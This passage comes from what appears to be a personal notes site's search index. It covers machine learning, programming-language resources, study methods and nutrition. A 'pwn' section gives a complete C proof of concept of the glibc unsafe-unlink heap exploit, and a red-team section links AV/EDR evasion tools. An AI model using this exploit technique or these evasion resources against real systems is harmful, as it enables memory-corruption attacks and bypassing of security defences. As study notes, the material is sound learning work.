rl</p>"},{"location":"ml/gradient-descent/","title":"Gradient Descent","text":""},{"location":"ml/gradient-descent/#algorithm","title":"algorithm","text":"\\[ w := lr \\frac{\\partial Loss(w, b)}{\\partial w} \\] \\[ \\\\ b := lr \\frac{\\partial Loss(w, b)}{\\partial b} \\]"},{"location":"ml/gradient-descent/#resources","title":"resources","text":"<p>ml specialization</p> <p>ibm</p>"},{"location":"ml/linear-regression/","title":"Linear Regression","text":""},{"location":"ml/linear-regression/#prediction","title":"Prediction","text":"<p>assumption of linearity means that the expected value of the target can be expressed as a weighted sum of it's features</p> \\[ \\hat{y} = Xw + b \\]"},{"location":"ml/linear-regression/#reality","title":"Reality","text":"<p>even if the best model for predicting y given x is linear, we would not expect any real world dataset where \\(\\(y^{(i)}\\)\\) exactly equals \\(\\(w^{(i)} x^{(i)}+b\\)\\) for all \\(\\(1 \\leq i \\leq n\\)\\) due to measurement errors and the like, as there will generally be some error.</p>"},{"location":"ml/linear-regression/#loss-function","title":"Loss Function","text":"<p>for linear regression. the mean squared error loss function is generally used</p> \\[ L(X, b) = \\frac{1}{n}\\sum_{i=1}^n{\\frac{1}{2}(\\hat{y}^{(i)} - y^{(i)})^2} \\]"},{"location":"ml/linear-regression/#analytic-solution","title":"Analytic solution","text":"<p>linear regression has an analytic solution. we can subsume the bias into the parameter \\(w\\) by appending a column to design matrix consisting of all ones. then the prediction problem becomes to minimize \\(\\(|| y - Xw ||^2\\)\\). taking the derivative with respect to \\(w\\) and setting it to zero, in the end yields solution.</p> \\[ w^* = (X^\\top X)^{-1}X^\\top y \\] <p>note that the solution will only be unique when \\(\\(X^\\top X\\)\\) is invertible.</p>"},{"location":"ml/linear-regression/#gradient-descent","title":"Gradient Descent","text":"<p>If we have an analytic solution, why would we need to use gradient descent?</p> <p>matrix multiplication is a very computationally intensive problem (\\(O(n^3)\\)), which means that while it gives an optimal solution, it's unfeasible to compute it on very large datasets. For such problems it's better to use other optimization solutions.</p> <p>notes on gradient descent</p>"},{"location":"ml/linear-regression/#example","title":"Example","text":"<pre><code>import torch\nimport matplotlib.pyplot as plt\n\nf = lambda x: -5 * x + 25\nxs = torch.arange(-5, 5, .25).view(-1, 1)\nys = f(xs)\n# add randomness to data\nys += torch.randn(ys.shape)\n\n# init\nweights = torch.randn((1,), requires_grad=True)\nbias = torch.tensor(0., requires_grad=True)\ndata = []\n# train\nfor i in range(100):\n  # feed forward\n  yhat = xs * weights + bias\n  loss = ((yhat - ys) ** 2 / 2).mean()\n  print(f'w={weights.item():e}, l={loss.item():e}, b={bias.item():e}')\n  # backprop\n  loss.backward()\n  # optimize\n  weights.data -= weights.grad.data * .01\n  bias.data -= bias.grad.data * .1\n\n  weights.grad.data.zero_()\n  bias.grad.data.zero_()\n</code></pre> <pre><code>w=1.132170e+00, l=4.839108e+02, b=0.000000e+00\nw=5.935752e-01, l=3.936823e+02, b=2.567060e+00\nw=1.031284e-01, l=3.203598e+02, b=4.870683e+00\nw=-3.435172e-01, l=2.607646e+02, b=6.937812e+00\nw=-7.503120e-01, l=2.123172e+02, b=8.792645e+00\n...\nw=-4.948588e+00, l=3.953586e-01, b=2.491010e+01\nw=-4.948682e+00, l=3.953578e-01, b=2.491014e+01\nw=-4.948768e+00, l=3.953570e-01, b=2.491017e+01\nw=-4.948846e+00, l=3.953564e-01, b=2.491020e+01\n</code></pre>"},{"location":"ml/linear-regression/#resources","title":"Resources","text":"<p>d2l</p> <p>ibm</p> <p>why gradient descent</p>"},{"location":"ml/logistic-regression/","title":"logistic regression","text":""},{"location":"ml/logistic-regression/#prediction","title":"prediction","text":"\\[ \\hat{y} = \\sigma(wx+b); \\textnormal{~$\\sigma$ is activation function (usually sigmoid)} \\]"},{"location":"ml/logistic-regression/#losscost-function","title":"loss/cost function","text":"\\[ LogLoss(w, b) = \\sum_y{-y\\log{\\hat{y}}- (1 - y) \\log{(1 - \\hat{y})}} \\]"},{"location":"ml/logistic-regression/#regularization","title":"regularization","text":""},{"location":"ml/logistic-regression/#resources","title":"resources","text":"<p>ml specitalization</p> <p>google developers</p>"},{"location":"ml/neural-networks/","title":"Neural Networks","text":"<p>a simple neural network</p>"},{"location":"ml/neural-networks/#structure","title":"Structure","text":"<p>A neural network is comprised of layers, split into input layer, output layer and (usually multiple) hidden layers. Each layer is made up of neurons. </p>"},{"location":"ml/neural-networks/#neuron","title":"Neuron","text":"<p>neuron structure</p> <p>each neuron has as input the outputs of all neurons of the previous layers, weights and a bias. it calculates the output in a two step process. first it calculates the weighted sum of it's weights and inputs, and adds the bias. it passes the result into an activation function.</p>"},{"location":"ml/neural-networks/#forward-pass","title":"Forward pass","text":"<p>A NN's output is calculated by going through layers (\\(\\(l_1^n\\)\\) ) and computing the activations of that layer:\\(\\(a^{[l]} = g^{[l]}(w^{[l]} a^{[l-1]} + b^{[l]})\\)\\) with \\(\\(a^{[0]}\\)\\) being the input layer \\(\\(X\\)\\). the output of the NN is then the output of the last layer \\(\\(\\hat{y} = a^{[n]}\\)\\)</p>"},{"location":"ml/neural-networks/#resources","title":"Resources","text":"<p>ibm</p> <p>ml specialization</p>"},{"location":"pl/","title":"Programming Languages","text":"<p>research on programming language design and implementation</p>"},{"location":"pl/#resources","title":"Resources","text":""},{"location":"pl/#awesome","title":"awesome","text":"<ul> <li>steshaw-plt</li> <li>learn-tt</li> <li>pls-lab classic papers</li> </ul>"},{"location":"pl/#wiki","title":"wiki","text":"<ul> <li>https://okmij.org/ftp/</li> <li>c2 wiki</li> <li>haskell research</li> </ul>"},{"location":"pl/#blogs","title":"blogs","text":""},{"location":"pl/#forums","title":"forums","text":"<ul> <li>pl reddit</li> </ul>"},{"location":"pl/#implementation","title":"implementation","text":"<ul> <li>awesome-compilers</li> <li>create-language</li> <li>pldesign-wiki</li> <li>pl-resources</li> <li>haskell-research</li> <li>classic-papers</li> <li>The Implementation of Functional Programming Languages</li> <li>write-you-a-haskell</li> <li>fun-compilers</li> </ul>"},{"location":"pl/#tutorials","title":"tutorials","text":"<p>crafting interpreters PL/0 in C, C in ?, jit ? in C++, jit ? in python, interpreter, haskell in ?, implementing a language in LLVM</p>"},{"location":"pl/#types","title":"types","text":"<ul> <li>goldmine</li> <li>reconstructing-typescript</li> <li>go-types</li> <li>type-inference</li> </ul>"},{"location":"pl/#other","title":"other","text":"<ul> <li> <p>millet</p> <p>modular codebase that you can use as a template for your next language</p> </li> <li> <p>project verona</p> </li> </ul>"},{"location":"pl/#todo","title":"Todo","text":""},{"location":"pl/#type-theory","title":"type theory","text":""},{"location":"pl/#modules","title":"modules","text":"<ul> <li>https://steshaw.org/plt/module-systems/</li> <li>first-class modules</li> <li>modular type classes</li> <li> <p>modular implicits</p> </li> <li> <p>1ml</p> <p>first-class modules. combining ml's core and module layer</p> </li> </ul>"},{"location":"pl/#parametric-overloadingtype-classes","title":"parametric overloading/type classes","text":"<ul> <li>dictionary passing</li> <li>https://okmij.org/ftp/Computation/typeclass.html</li> </ul>"},{"location":"pl/#gadt","title":"gadt","text":""},{"location":"pl/#polymorphic-recursion","title":"polymorphic recursion","text":""},{"location":"pl/#linear-types","title":"linear types","text":""},{"location":"pl/#capabilities","title":"capabilities","text":""},{"location":"pl/#effect-system","title":"effect system","text":"<ul> <li>An Introduction to Algebraic Effects and Handlers</li> <li>https://github.com/yallop/effects-bibliography</li> <li>extensible effects</li> <li>effect handler oriented programming</li> </ul> <p>languages with effect systems: - effekt - koka - unison (effect system for capabilities)</p>"},{"location":"pl/#dependent-types","title":"dependent types","text":""},{"location":"pl/#refinement-types","title":"refinement types","text":""},{"location":"pl/#higher-rank-polymorphism","title":"higher-rank polymorphism","text":""},{"location":"pl/#actors","title":"actors","text":""},{"location":"pl/#capabilities_1","title":"capabilities","text":""},{"location":"pl/#continuations","title":"continuations","text":""},{"location":"pl/#row-polymorphism","title":"row polymorphism","text":""},{"location":"pl/#denotational-semantics","title":"denotational semantics","text":""},{"location":"pl/#theorem-proving","title":"theorem proving","text":""},{"location":"pl/#delimited-continuations","title":"delimited continuations","text":"<p>agda, coq, lean</p>"},{"location":"pl/#languages","title":"languages","text":"<ul> <li>ats</li> <li> <p>habit</p> <p>low level functional language</p> </li> <li> <p>clean</p> </li> <li> <p>austral</p> <p>capabilities, linear types</p> </li> <li> <p>micro-mitten</p> <p>compile-time memory management</p> </li> </ul>"},{"location":"pl/#compilers","title":"compilers","text":"<ul> <li>scanning</li> <li>parsing</li> <li>semantic analysis</li> <li>optimization</li> <li>code generation</li> </ul>"},{"location":"pl/#runtime-systems","title":"runtime systems","text":"<ul> <li>garbage collection</li> <li>virtual machines</li> </ul>"},{"location":"pl/#programming-language-semantics","title":"programming language semantics","text":"<p>https://hackmd.io/@alexhkurz/Hkf6BTL6Phttps://hackmd.io/@alexhkurz/Hkf6BTL6P</p> <ul> <li>domain theory</li> <li>operational/denoational semantics</li> </ul>"},{"location":"pl/design/","title":"Programming language design","text":""},{"location":"pl/design/pattern-matching/","title":"Pattern Matching","text":"<ul> <li>The Ultimate Conditional Syntax: https://cse.hkust.edu.hk/~parreaux/papers/ultimate-conditional-syntax-ml22/</li> </ul>"},{"location":"pl/oil/","title":"Oil","text":"<p>toy (1) programming language i'm making while learning pl implementation</p> <ol> <li>for now...</li> </ol> <p>name is temporary (1) (2) (3) (4)</p> <ol> <li>name comes from one of the best neovim plugins (oil.nvim)</li> <li>oil prevents rust</li> <li>joke on programming languages named after precious stuff (ruby, crystal, ...)</li> <li>it's an acronym :)</li> </ol>"},{"location":"pl/oil/#idea","title":"idea","text":"<p>low-level functional programming language.</p>"},{"location":"pl/type-theory/","title":"Type Theory","text":""},{"location":"programming/concepts-and-techniques/","title":"Concepts &amp; Techniques","text":""},{"location":"programming/concepts-and-techniques/#books","title":"Books","text":"<p>Concepts, Techniques, and Models of Computer Programming</p> <p>Structure and Interpretation of Computer Programs</p>"},{"location":"programming/cpp/","title":"C++","text":"<p>refs: so book list</p> <ul> <li>effective c++</li> </ul> <p>up next:</p> <ul> <li>large scale c++ vol 1</li> <li>effective modern c++</li> <li>effective stl</li> <li>more effective c++</li> </ul>"},{"location":"programming/design-and-software-engineering/","title":"Design &amp; Software Engineering","text":""},{"location":"programming/design-and-software-engineering/#books","title":"Books","text":"<p>Design patterns: elements of reusable object-oriented software</p>"},{"location":"programming/design-and-software-engineering/#homeless","title":"Homeless","text":"<p>https://refactoring.guru/</p>"},{"location":"programming/functional-programming/","title":"Functional Programming","text":""},{"location":"programming/functional-programming/#reading-list","title":"reading list","text":""},{"location":"programming/functional-programming/#why-functional-programming-matters","title":"Why Functional Programming Matters","text":"<ul> <li>presents benefits of lazy evaluation and composition of functions</li> <li>examples seem a bit contrived, but perhaps it's just because i'm not familiar with the formulas and to mathematicians these are more natural. I didn't bother reasoning through them, because I knew where it was going and what it was trying to say</li> <li>overall, a good read. you won't get much out of it if you're already a seasoned functional programmer<sup>1</sup>, but may provide the aha moment for someone coming from other paradigms</li> </ul> <ol> <li> <p>though you can still read it as it's considered a classic\u00a0\u21a9</p> </li> </ol>"},{"location":"programming/haskell/","title":"Haskell","text":""},{"location":"programming/haskell/#learning","title":"learning","text":"<p>to learn the language, i recommend</p> <ul> <li>cis194</li> <li>real world haskell</li> <li>learn you a haskell</li> </ul> <p>you can do a couple exercises</p> <ul> <li>99 haskell problems</li> <li>exercism</li> <li>advent of code</li> </ul> <p>after you get bored with that, you can try following a project</p> <ul> <li> <p>write yourself a scheme in 48 hours</p> <p>i recommend using megaparsec instead of parsec for an additional challenge with this tutorial</p> </li> <li> <p>write yourself a scheme v2</p> <p>modernized version. recommend going through this after original as it's a bit more advanced.</p> </li> </ul>"},{"location":"programming/haskell/#awesome","title":"awesome","text":"<ul> <li>haskell docs</li> </ul> <p>This page lists various resources to help you with Haskell</p>"},{"location":"programming/ocaml/","title":"Ocaml","text":""},{"location":"programming/rust/","title":"Rust","text":"<p>refs: awesome rust</p> <ul> <li>crust of rust</li> <li>too many linked lists</li> <li>learning material for idiomatic rust</li> </ul> <p>up next:</p> <ul> <li>design-principles</li> </ul>"},{"location":"programming/todo/","title":"Todo","text":""},{"location":"programming/todo/#monads","title":"monads","text":"<ul> <li>hs-wiki and the see also section</li> </ul>"},{"location":"programming/todo/#arrows","title":"arrows","text":"<ul> <li>https://www.haskell.org/arrows/</li> </ul>"},{"location":"programming/todo/#monadic-parser-combinators","title":"Monadic Parser Combinators","text":"<p>https://deepsource.com/blog/monadic-parser-combinators http://www.cs.nott.ac.uk/~pszgmh/pearl.pdf</p>"},{"location":"programming/dsa/","title":"Data Structures and Algorithms","text":""},{"location":"programming/dsa/#cp-1","title":"Cp (1)","text":"<ol> <li>competitive programming. the other cp is elsewhere</li> </ol>"},{"location":"programming/dsa/#practice-sites","title":"Practice sites","text":"<ul> <li>codeforces</li> <li> <p>project euler</p> <p>not specifically for cp. more math oriented</p> </li> </ul>"},{"location":"programming/dsa/#todo","title":"Todo","text":"<p>refs: 1 2 3 4 5 problems: cses</p>"},{"location":"programming/dsa/#data-structures-and-algorithms_1","title":"data structures and algorithms","text":""},{"location":"programming/dsa/#array","title":"array","text":"<p>refs: 1 prefix sum suffix array</p>"},{"location":"programming/dsa/#algorithms","title":"algorithms","text":"<p>sorting binary search two pointers: usaco cf academy cph 8.1 largest sum subarray (Kadane\u2019s Algorithm)</p>"},{"location":"programming/dsa/#string","title":"string","text":"<p>rope</p>"},{"location":"programming/dsa/#algorithms_1","title":"algorithms","text":"<p>KMP algorithm</p>"},{"location":"programming/dsa/#graph","title":"graph","text":"<p>forest</p>"},{"location":"programming/dsa/#algorithms_2","title":"algorithms","text":"<p>bfs dfs max flow topological sort</p>"},{"location":"programming/dsa/#tree","title":"tree","text":"<p>heap Huffman tree trie binary search tree segment tree interval tree Fenwick tree range tree AVL tree suffix tree Treap (cartesian tree) k-d tree splay tree palindromic tree radix tree red black tree</p>"},{"location":"programming/dsa/#other","title":"other","text":"<p>linked list (singly, doubly, circular...) stack queue dequeue priority queue set map (hash table) matrix hash disjoint set sparse table suffix automaton</p>"},{"location":"programming/dsa/#paradigms","title":"paradigms","text":""},{"location":"programming/dsa/#dynamic-programming","title":"dynamic programming","text":""},{"location":"programming/dsa/#backtracking","title":"backtracking","text":""},{"location":"programming/dsa/#greedy","title":"greedy","text":""},{"location":"programming/dsa/#complete-search","title":"complete search","text":""},{"location":"programming/dsa/#math","title":"math","text":"<p>complexity (big-O) math: * number theory:     * primes (Sieve of Eratosthenes)     * modular arithmetic     * gcd, lcm (euclid's algorithm)     * long arithmetic (mod, arbitrary precision math) * combinatorics * computational geometry     * Handbook of geometry for competitive programmers * graph theory * discrete mathematics</p>"},{"location":"programming/dsa/#resources","title":"resources","text":"<p>yt: williamfiset</p>"},{"location":"programming/dsa/range-query/","title":"Range query","text":"<p>Segment Tree</p> Todo <ul> <li>prefix sum</li> <li>binary indexed tree</li> <li>Order Statistic Tree</li> </ul>"},{"location":"programming/dsa/segment-tree/","title":"Segment Tree","text":"Resources <ul> <li>cph 9.3 pg. 89</li> <li>video: cf edu</li> <li>more resources at usaco guide</li> </ul>"},{"location":"pwn/heap/","title":"Heap","text":"<p>heap-exploitation: glibc and heap exploitation tutorial</p> <p>how2heap: list of heap exploits with POCs</p>"},{"location":"pwn/heap/unsafe-unlink-exploit/","title":"unsafe-unlink exploit","text":"<p>exploit works on most recent version of libc. on older versions of libc (before tcache) it's even more powerful.</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;assert.h&gt;\n\ntypedef struct chunk {\n  int64_t       prev_size;\n  int64_t       size;\n  struct chunk* fd;\n  struct chunk* bk;\n} chunk;\n\nuint64_t* c0_ptr;\n\nint main() {\n  uint64_t* c1_ptr;\n\n  // don't use tcache or fastbin\n  c0_ptr = malloc(0x420);\n  c1_ptr = malloc(0x420);\n  chunk *c0 = (uint64_t*) c0_ptr - 2;\n  chunk *c1 = (uint64_t*) c1_ptr - 2;\n  // create fake chunk inside c0\n  chunk *fake_chunk = (chunk*) c0_ptr;\n  fake_chunk-&gt;size = c0-&gt;size - 0x10; // -0x10 for prev_size and size (fake chunk starts at c0[2])\n\n  // make sure fakechunk-&gt;bk-&gt;fd == fake_chunk\n  chunk *fd_eq_fake = (uint64_t*)&amp;c0_ptr - 2;\n  assert(fd_eq_fake-&gt;fd == fake_chunk);\n  fake_chunk-&gt;bk = fd_eq_fake;\n  assert(fake_chunk-&gt;bk-&gt;fd == fake_chunk);\n\n  // make sure fakechunk-&gt;fd-&gt;bk == fake_chunk\n  chunk *bk_eq_fake = (uint64_t*)&amp;c0_ptr - 3;\n  assert(bk_eq_fake-&gt;bk == fake_chunk);\n  fake_chunk-&gt;fd = bk_eq_fake;\n  assert(fake_chunk-&gt;fd-&gt;bk == fake_chunk);\n\n  // update following chunk metadata\n  c1-&gt;prev_size = 0x420;\n  c1-&gt;size &amp;= ~1; // unset prev_in_use bit\n\n  free(c1_ptr);\n\n  char sens[8] = \"Hello!~\";\n\n  c0_ptr[3] = sens;\n\n  c0_ptr[0] = 0x0042414141414141L;\n\n  printf(\"%s\\n\", sens);\n}\n</code></pre>"},{"location":"pwn/heap/unsafe-unlink-exploit/#learning-resources","title":"Learning resources","text":"<p>heap-exploitation</p> <p>how2heap</p> <p>nightmare</p>"},{"location":"pwn/heap/unsafe-unlink-exploit/#practice","title":"Practice","text":"<p>0ctf Quals 2017 - BabyHeap2017</p> <p>hitcon14_stkof</p> <p>zctf16_note2</p>"},{"location":"pwn/stack/","title":"Stack","text":""},{"location":"pwn/stack/rop/","title":"ROP","text":"<p>https://ropemporium.com/</p>"},{"location":"red-team/defense-evasion/","title":"Defense evasion","text":"<p>https://0x00sec.org/t/written-a-loader-dropper-in-c-have-a-question-about-meterpreter/32888/5?u=santa</p> <p>https://unit42.paloaltonetworks.com/fast-flux-101/</p> <p>https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/</p> <p>https://github.com/Ondrik8/byPass_AV</p> <p>https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/</p> <p>https://github.com/trustedsec/unicorn</p> <p>https://github.com/CheckPointSW/Evasions</p>"},{"location":"red-team/fuzzing/","title":"Fuzzing","text":""},{"location":"red-team/fuzzing/#awesome","title":"Awesome","text":"<p>https://github.com/secfigo/Awesome-Fuzzing</p> <p>https://github.com/cpuu/awesome-fuzzing</p>"},{"location":"red-team/fuzzing/#todo","title":"TODO","text":"<p>Address sanitizing (ASan)</p> <p>qasan</p> <p>valgrind</p> <p>kcachegrind</p> <p>lcov</p> <p>afl</p> <p>dynamorio</p>"},{"location":"red-team/malware/","title":"Malware","text":""},{"location":"red-team/malware/#injection","title":"Injection","text":""},{"location":"red-team/malware/#fileless","title":"Fileless","text":""},{"location":"red-team/web/","title":"Web","text":""},{"location":"red-team/web/#links","title":"Links","text":"<p>bug hunter handbook</p>"},{"location":"red-team/web/#sql-injection","title":"Sql Injection","text":"<p>portswigger web security academy</p> <p>sqlinjection.net</p>"},{"location":"red-team/kernel/vbs/","title":"VBS","text":"<ul> <li>Hyper-V Architecture</li> <li>Hyper-V top-level functional specification (TLFS)</li> <li>Virtual Trust Levels (VTL)</li> <li>Secure Kernel (SK)</li> <li>HyperGuard (SKPG)</li> <li>HyperVisor Protected Code Integrity (HVCI)</li> <li>Kernel Control Flow Graph (KCFG)</li> <li>Kernel Data Protection (KDP)</li> <li>VT-x/AMD-V</li> <li>second-level address translation (SLAT)</li> <li>mode based execution control (MBEC)</li> </ul>"},{"location":"self-improvement/","title":"Self Improvement","text":"Todo <ul> <li>memory-&gt;mnemonics</li> <li>speed reading</li> <li>ergonomics</li> <li>posture</li> <li>typing</li> <li>study</li> <li>dental health</li> <li>exercise</li> <li>sleep</li> <li>diet</li> <li>mental health<ul> <li>meditation</li> </ul> </li> </ul>"},{"location":"self-improvement/critical-thinking/","title":"Critical Thinking","text":""},{"location":"self-improvement/critical-thinking/#observation","title":"observation","text":"<p>identify new problems. to do so, you need to slow down and pay attention.</p> <p>mindfulness, journalling, curiosity, open-mindedness</p>"},{"location":"self-improvement/critical-thinking/#active-listening","title":"active listening","text":""},{"location":"self-improvement/critical-thinking/#analysis","title":"analysis","text":"<p>analytical skills, research, determining relevance, meta-cognition, challenging assumptions, logic, elements and standards of reasoning, close reading</p>"},{"location":"self-improvement/critical-thinking/#cognitive-biases","title":"cognitive biases","text":""},{"location":"self-improvement/critical-thinking/#logical-fallacies","title":"logical fallacies","text":"<ul> <li>[bad-arguments]</li> </ul>"},{"location":"self-improvement/critical-thinking/#decision-making","title":"decision making","text":"<p>inference</p>"},{"location":"self-improvement/critical-thinking/#reading-list","title":"reading list","text":"<ul> <li>How to Think About Weird Things: Critical Thinking for a New Age</li> <li>Learning to Think Things Through: A Guide to Critical Thinking Across the Curriculum</li> <li>Thinking, Fast and Slow</li> </ul>"},{"location":"self-improvement/critical-thinking/#references","title":"references","text":"<ul> <li>https://bookofbadarguments.com/</li> <li>https://theelementsofthought.org/</li> <li>https://www.criticalthinking.org/pages/index-of-articles/1021/</li> </ul>"},{"location":"self-improvement/learning/","title":"Learning","text":"<p>notetaking:</p> <ul> <li>set up cornell notetaking method (two lines)</li> <li>morse code method</li> <li>QEC method</li> </ul> <p>top down method</p> <p>parreto principle (80/20 rule): 80% of results come from 20% of the causes stare at who you want to become 1: #1 pay attention immediately after you make a mistake: don't pretend like it didn't happen. what can you do next to improve? refs: 1: #22</p> <p>visualisation for performance</p> <p>cheat sheet: why do i need to memorize these facts. if i truly umderstood the subject, would i still need to memorize them?</p> <p>moore. weakest student questions</p>"},{"location":"self-improvement/learning/#understand-deeply","title":"understand deeply","text":"<ul> <li>master the fundementals (constantly revisit the basic concepts in the subject)</li> <li>ask what you know: write a detailed list of fundementals. do you really   understand them?</li> <li>can you teach it to someone else? (feynman technique)</li> </ul> <p>problem you can't solve:</p> <ul> <li>break it down into smaller pieces that you can solve (chunking)</li> <li>find an easier problem that you can solve</li> <li>ask questions</li> <li>be your own socrates</li> <li>are there hidden assumptions, bias, vagueness, errors</li> <li>when you don't know something, you want to know that you don't know as soon as   possible</li> <li>question everything and everyone around you</li> <li>ask what if... (see if you can go deeper)</li> <li>look at it from another perspective. ask what if this were false</li> </ul>"},{"location":"self-improvement/learning/#fail-and-fail-hard","title":"fail, and fail hard","text":"<p>make an attempt, find one thing wrong with it, fix that thing, repeat ask whether the mistake is the answer to another question</p>"},{"location":"self-improvement/learning/#study-info-gathering","title":"study (info gathering)","text":"<ul> <li>should be 90 minutes total</li> </ul>"},{"location":"self-improvement/learning/#before","title":"before","text":"<ul> <li>binatural beats 5 mins yt</li> <li>look at a point. refocus your attention when it wanders</li> <li>cyclic hyperventilation</li> </ul>"},{"location":"self-improvement/learning/#during","title":"during","text":"<ul> <li> <p>white/pink noise while studying</p> </li> <li> <p>prime yourself for study (priming effect)</p> </li> <li>solve a couple problems or answer some questions from previous sessions on     this subject</li> <li>skim</li> <li>read the first paragraph, the headings and first sentences of later     paragraphs and sections, look at images, read the introduction/conclusion if     there are any, read a couple sentences before/after keywords</li> <li>goal is to learn about the ideas and structure of their development</li> <li>determine some questions (from chapter headings, end of chapter questions,     reading objectives)</li> <li> <p>select what you're going to read. do you need to read all sections?</p> </li> <li> <p>read in sections (~20mins at a time)</p> </li> <li>ask questions</li> <li>why is an explicitly stated fact or concept is true (Elaborative interrogation)</li> <li>be precise</li> <li>be frequent</li> <li>how is new information is related to known information, or explaining steps     taken during problem solving (Self-explanation)     &gt; [!important] Todo: which questions to ask?</li> <li>Attempting to form mental images of text materials while reading or listening</li> <li>some material may not allow it (only useful when you can generate images)</li> <li>take notes on paper</li> <li>write down questions that you think a professor would put on the test</li> <li>keep in mind the questions you got in the [[#before]] section</li> <li>RAP method:</li> <li>read a paragraph or a section</li> <li>ask questions about what you just read (min 3)</li> <li>put answers into your own words</li> <li>summarise the material in your own words (with only the toc as help)</li> <li> <p>[[#understand deeply]]</p> </li> <li> <p>go over notes and transfer them to vault</p> </li> <li>transform the content in some way</li> <li>tie it into the existing information</li> <li>minimize it (ask if it's really important to store it)</li> <li>make mental images (if possible)</li> <li>try to answer the questions you wrote and then scan for it</li> <li>find exercises for the material</li> </ul>"},{"location":"self-improvement/learning/#after","title":"after","text":"<ul> <li>meditation or nsdr after study</li> <li>track habit</li> </ul>"},{"location":"self-improvement/learning/#practice-info-retention","title":"practice (info retention)","text":"<ul> <li>Spread out sessions as much as possible (for some material) (Distributed practice)</li> <li>10-20% of desired retention interval</li> <li>mix different kinds of problems within a single study session (Interleaved practice)</li> <li>even if you don't know [[#fail, and fail hard]]</li> </ul>"},{"location":"self-improvement/learning/#practice-skill-acquisition","title":"practice (skill acquisition)","text":"<p>set goals for the session (SMART)</p> <ul> <li>hard, but not too hard: you should get to the edge of your abilities</li> </ul>"},{"location":"self-improvement/learning/#references","title":"references","text":"<ul> <li>5 elements of effective thinking</li> <li>Improving Students\u2019 Learning With Effective Learning Techniques</li> <li>deliberate practice</li> <li>owll study skills</li> </ul>"},{"location":"self-improvement/memory/","title":"Memory","text":"idea <p>memorize port number services by connecting \"port\" with a place (e.g. dungeon). memorize ssh port by linking a sea shell with dungeon and pao number of 22. when recalling ssh port you recall what the seashell (ssh) was doing in the dungeon (ports)</p>"},{"location":"self-improvement/nutrition/metabolism/","title":"metabolism","text":"<p>anabolic reactions: building glycogen (glucose), protein (amino acids) and triglycerides (glycerol + fatty acids). they require energy</p> <p>catabolic reactions: breaking them down. they release energy. much energy is stored in bonds of ATP which fuels anabolic reactions</p> <p>amino acids, glucose and glycerol (but not fatty acids) can then be converted to pyruvate</p>"},{"location":"self-improvement/nutrition/metabolism/#glucose","title":"glucose","text":"<p>glucose first goes through glycolysis to produce pyruvate</p> <p>glycolysis : the breakdown of glucose to pyruvate</p> <p>pyruvate can then be converted either to:</p> <ul> <li>acetyl-CoA (aerobic)</li> <li>lactate (anaerobic):   during intense exercise, muscles rely on anaerobic glycolysis to produce ATP   quickly. pyruvate is converted to lactate, which travels to liver and gets   converted back to glucose, enabling glycolisis to continue (Cori cycle)</li> </ul> <p>conversion of pyruvate to acetyl-CoA produces more ATP than glycolysis</p>"},{"location":"self-improvement/nutrition/metabolism/#tryglicerides","title":"tryglicerides","text":"<p>tryglicerides are broken down to glycerol and fatty acids</p> <p>glycerol can be converted to pyruvate (and then acetyl-CoA) or glucose and makes up ~5% of the energy in a triglyceride</p>"},{"location":"self-improvement/nutrition/metabolism/#amino-acids","title":"amino acids","text":"<p>most amino acids can be converted to pyruvate (glycogenic)</p> <p>some amino acids are converted to acetyl-CoA directly (ketogenic)</p> <p>some amino acids can enter TCA cycle directly as compounds other than acetyl-CoA (glucogenic)</p>"},{"location":"self-improvement/nutrition/metabolism/#acetyl-coa","title":"acetyl-CoA","text":"<p>most energy-yielding nutrients are converted to acetyl-CoA. acetyle-CoA can be used to make ATP through TCA cycle. when there is abundant ATP, acetyl-CoA makes fat</p>"},{"location":"self-improvement/nutrition/metabolism/#tca-cycle","title":"TCA cycle","text":"<p>chemistry...</p> <p>fat is the preferred energy source due to higher energy yield per gram</p>"},{"location":"self-improvement/nutrition/metabolism/#feasting-excess-energy","title":"feasting (excess energy)","text":"<p>in this case, metabolism favors fat formation</p> <p>pathway from dietary fat is simplest (costs less energy)</p> <p>excess of protein and carbs increases oxidation, whereas excess of fat gets stored efficiently</p> <p>carbs get stored as glycogen, but the capacity is limited and excess is converted to fat.</p> <p>maintaining glucose levels is critical, the body uses glucose frugally when the diet provides small amounts</p>"},{"location":"self-improvement/nutrition/metabolism/#fasting-low-energy","title":"fasting (low energy)","text":"<p>gluconeogenesis : the synthesis of glucose from non-carbohydrate sources</p> <p>as glucose is the primary energy source, lack of carbohydrates becomes a problem</p> <p>glycerol and amino acids can be converted to glucose. to obtain amino acids, the body breaks down muscle protein</p> <p>in the first few days of a fast, about 90% of the energy comes from breakdown of body protein (10% from glycerol)</p> <p>if breakdown of body protein continued at this rate, death would result in less than 3 weeks. fortunately, fat breakdown increases (almost doubles).</p> <p>as the fast continues, the brain start to use fat as a fuel source (acetyl-CoA fragments from fatty acids produce an alternate fuel for the brain - ketone bodies)</p> <p>ketone body production rises for about 10days. still many areas of the brain rely exclusively on glucose and to produce it, the body continues to sacrifice protein</p>"},{"location":"self-improvement/nutrition/supplements/","title":"Supplements","text":""},{"location":"self-improvement/nutrition/supplements/#general-and-deficiencies","title":"general and deficiencies","text":""},{"location":"self-improvement/nutrition/supplements/#electrolytes","title":"electrolytes","text":"<p>sodium, potassium, magnesium glycinate, calcium</p>"},{"location":"self-improvement/nutrition/supplements/#cod-liver-oil-omega-3","title":"cod liver oil - omega-3","text":""},{"location":"self-improvement/nutrition/supplements/#multivitamin","title":"multivitamin","text":""},{"location":"self-improvement/nutrition/supplements/#vitamin-d","title":"vitamin D","text":""},{"location":"self-improvement/nutrition/supplements/#fiber","title":"fiber","text":""},{"location":"self-improvement/nutrition/supplements/#probiotics","title":"probiotics","text":""},{"location":"self-improvement/nutrition/supplements/#exercise","title":"exercise","text":"<p>see also: - caffeine - ashwagandha</p>"},{"location":"self-improvement/nutrition/supplements/#creatine","title":"creatine","text":""},{"location":"self-improvement/nutrition/supplements/#beta-alanine","title":"beta-alanine","text":""},{"location":"self-improvement/nutrition/supplements/#whey-protein","title":"whey - protein","text":""},{"location":"self-improvement/nutrition/supplements/#cognition","title":"cognition","text":""},{"location":"self-improvement/nutrition/supplements/#caffeine","title":"caffeine","text":""},{"location":"self-improvement/nutrition/supplements/#nicotine","title":"nicotine","text":""},{"location":"self-improvement/nutrition/supplements/#sleep","title":"sleep","text":"<p>see also: - 